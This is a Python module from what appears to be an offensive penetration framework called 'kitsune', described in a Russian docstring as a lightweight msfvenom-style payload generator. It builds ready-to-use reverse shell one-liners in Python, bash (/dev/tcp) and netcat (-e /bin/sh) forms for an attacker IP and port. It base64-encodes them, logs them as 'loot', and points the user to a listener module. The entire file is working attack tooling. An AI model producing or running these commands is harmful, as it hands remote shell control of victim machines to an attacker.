"""payloads/reverse_shell — генератор пейлодов (msfvenom-lite, печатает команду)."""

import base64

from kitsune import db
from kitsune.framework import Module

PY_SRC = (
    "import socket,subprocess,os;"
    "s=socket.socket();s.connect(({host},{port}));"
    "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
    "subprocess.call(['/bin/sh','-i'])"
)


class Module(Module):
    meta = {
        "name": "payloads/reverse_shell",
        "author": "kitsune",
        "description": "print ready reverse shell one-liners for your lhost/lport",
        "options": {
            "lhost": {"default": "127.0.0.1", "required": True, "desc": "attacker IP"},
            "lport": {"default": "4444", "required": True, "desc": "attacker port"},
            "type":  {"default": "python", "required": False, "desc": "python|bash|nc (info uses them all)"},
        },
    }

    def run(self):
        host, port = self.lhost, self.lport
        snippets = {
            "python": 'python3 -c \'import socket,subprocess,os;'
                      f's=socket.socket();s.connect(("{host}",{port}));'
                      "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                      "subprocess.call([\"/bin/sh\",\"-i\"])'",
            "bash":   f"bash -i >& /dev/tcp/{host}/{port} 0>&1",
            "nc":     f"nc -e /bin/sh {host} {port}",
        }
        self.ok(f"payload gen for {host}:{port}")
        rows = []
        for label, cmd in snippets.items():
            encoded = base64.b64encode(cmd.encode()).decode()
            rows.append((label, cmd[:58] + "...", encoded[:40] + "..."))
            db.add_loot("payload", host, f"[{label}] {cmd}")
        self.table(("Type", "Command", "Base64"), rows)

        if self.type in snippets:
            self.ok(f"best match ({self.type}):\n        {snippets[self.type]}")
        self.warn("pair this with `use payloads/listener` first!")
